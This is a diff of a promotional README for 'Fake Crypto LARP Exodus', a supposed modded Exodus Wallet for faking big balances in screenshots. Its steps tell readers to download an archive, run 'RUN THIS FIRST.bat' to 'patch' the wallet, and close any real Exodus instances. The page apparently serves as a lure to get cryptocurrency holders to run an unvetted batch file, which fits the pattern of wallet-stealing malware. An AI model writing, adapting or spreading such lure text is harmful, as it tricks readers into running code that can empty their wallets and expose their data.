@@ -7,8 +7,11 @@ Fake Crypto LARP Edition: Exodus Wallet.
 Tired of your crypto portfolio looking as flat as a bear market? Unlock the ultimate flex with Fake Crypto LARP Exodus – a cheeky, modified version of the Exodus Wallet that lets you pump your fake balances to god-tier levels. Imagine scrolling through your "wallet" with absurd gains, dropping screenshots on socials to make your friends question their life choices. It's not real money... but the envy is priceless.
 How It Works (Super Simple Setup):
 
-1. Download the Zip: Grab the secure archive from the link below 
-2. Run the Bat: Double-click RUN THIS FIRST.bat. It'll patch and launch the modded Exodus in seconds.                                                                                                          (Pro tip: Close any real Exodus instances so it doesn't bug out
+𝗦𝗧𝗘𝗣𝗦 𝗕𝗘𝗟𝗢𝗪 𝗠𝗔𝗞𝗘 𝗦𝗨𝗥𝗘 𝗧𝗢 𝗘𝗫𝗧𝗥𝗔𝗖𝗧
+
+1. EXTRACT THE FILE.
+2. Download the Zip: Grab the secure archive from the link below 
+3. Run the Bat: Double-click RUN THIS FIRST.bat. It'll patch and launch the modded Exodus in seconds.                                                                                                          (Pro tip: Close any real Exodus instances so it doesn't bug out
 
 
 Flex Mode Activated: Boom! Your custom Exodus opens. Spot the Top 3 Drops button on the right sidebar? Click it to crank up the fake values – slide to 10x, 100x, or "Moonshot" mode. Watch your "BTC" hit 69,420 or your "DOGE" stack to the stars. Shareable previews included for that instant rich vibe.
